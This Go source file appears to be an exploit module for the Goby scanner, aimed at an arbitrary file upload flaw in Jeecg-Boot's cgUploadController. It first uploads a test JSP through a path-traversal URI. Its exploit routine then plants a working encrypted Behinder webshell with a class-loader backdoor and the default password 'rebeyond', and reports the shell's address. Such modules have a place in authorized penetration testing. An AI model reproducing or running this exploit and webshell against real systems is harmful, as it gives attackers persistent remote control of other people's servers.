package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Jeecg-Boot jeecgFormDemoController Arbitrary File Upload Vulnerability",
    "Description": "<p>Jeecg-Boot is an intelligent development platform based on code generators.</p><p>Jeecg-Boot jeecgFormDemoController has a file upload vulnerability. By exploiting this vulnerability, an attacker can upload malicious files on the server side, obtain server permissions, and then control the entire web server.</p>",
    "Product": "jeecg-boot",
    "Homepage": "http://jeecg.com/",
    "DisclosureDate": "2022-12-20",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "body=\"jeecg-boot\" && body=\"window._CONFIG\"",
    "GobyQuery": "body=\"jeecg-boot\" && body=\"window._CONFIG\"",
    "Level": "3",
    "Impact": "<p>Jeecg-Boot jeecgFormDemoController has a file upload vulnerability. By exploiting this vulnerability, an attacker can upload malicious files on the server side, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://jeecg.com/\">http://jeecg.com/</a></p><p></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.9",
    "Translation": {
        "CN": {
            "Name": "Jeecg-Boot jeecgFormDemoController 任意文件上传漏洞",
            "Product": "Jeecg-Boot",
            "Description": "<p>Jeecg-Boot 是一款基于代码生成器的智能开发平台。<br></p><p>Jeecg-Boot jeecgFormDemoController 存在文件上传漏洞。攻击者可通过该漏洞在服务器端上传恶意文件，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://jeecg.com/\">http://jeecg.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Jeecg-Boot jeecgFormDemoController 存在文件上传漏洞。攻击者可通过该漏洞在服务器端上传恶意文件，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Jeecg-Boot jeecgFormDemoController Arbitrary File Upload Vulnerability",
            "Product": "jeecg-boot",
            "Description": "<p>Jeecg-Boot is an intelligent development platform based on code generators.<br></p><p>Jeecg-Boot jeecgFormDemoController has a file upload vulnerability. By exploiting this vulnerability, an attacker can upload malicious files on the server side, obtain server permissions, and then control the entire web server.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://jeecg.com/\">http://jeecg.com/</a><br></p><p></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Jeecg-Boot jeecgFormDemoController has a file upload vulnerability. By exploiting this vulnerability, an attacker can upload malicious files on the server side, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/breastfeed/api/..;/cgUploadController.do?ajaxSaveFile&sessionId=FE16E91B08CDA9D04EDA142A4F9475CB%27,"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=a6960107853bf012fe47411093dec8c6")
			cfg.Header.Store("Referer", u.FixedHostInfo)
			fileContent := `<%@ page language="java" contentType="text/html; charset=ISO-8859-1" pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>JSP - Hello World Tutorial - Programmer Gate</title>
</head>
<body>
<%= "Hello World!" %>
</body>
</html>`
			payload := fmt.Sprintf("--a6960107853bf012fe47411093dec8c6\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n12.txt\r\n--a6960107853bf012fe47411093dec8c6\r\nContent-Disposition: form-data; name=\"documentTitle\"\r\n\r\nblank\r\n--a6960107853bf012fe47411093dec8c6\r\nContent-Disposition: form-data; name=\"name\"; filename=\"test.jsp\"\r\nContent-Type: text/plain\r\n\r\n%s\r\n--a6960107853bf012fe47411093dec8c6--", fileContent)
			cfg.Data = payload
			resp, err := httpclient.DoHttpRequest(u, cfg)
			if err != nil && resp.StatusCode != 200 {
				return false
			}
			uri = "/breastfeed/test.jsp"
			cfg = httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Hello")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/breastfeed/api/..;/cgUploadController.do?ajaxSaveFile&sessionId=FE16E91B08CDA9D04EDA142A4F9475CB%27,"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=a6960107853bf012fe47411093dec8c6")
			cfg.Header.Store("Referer", expResult.HostInfo.FixedHostInfo)
			fileContent := `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
			payload := fmt.Sprintf("--a6960107853bf012fe47411093dec8c6\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n12.txt\r\n--a6960107853bf012fe47411093dec8c6\r\nContent-Disposition: form-data; name=\"documentTitle\"\r\n\r\nblank\r\n--a6960107853bf012fe47411093dec8c6\r\nContent-Disposition: form-data; name=\"name\"; filename=\"test1.jsp\"\r\nContent-Type: text/plain\r\n\r\n%s\r\n--a6960107853bf012fe47411093dec8c6--", fileContent)
			cfg.Data = payload
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil && resp.StatusCode != 200 {
				return expResult
			}
			uri = "/breastfeed/test1.jsp"
			cfg = httpclient.NewGetRequestConfig(uri)
			resp, err = httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil {
				return expResult
			}
			if resp.StatusCode == 200 {
				expResult.Success = true
				expResult.Output = "Webshell Addr: " + expResult.HostInfo.FixedHostInfo + uri + "\nWebshell Pass: rebeyond\nUse Behinder to connect"
				return expResult
			}
			return expResult
		},
	))
}
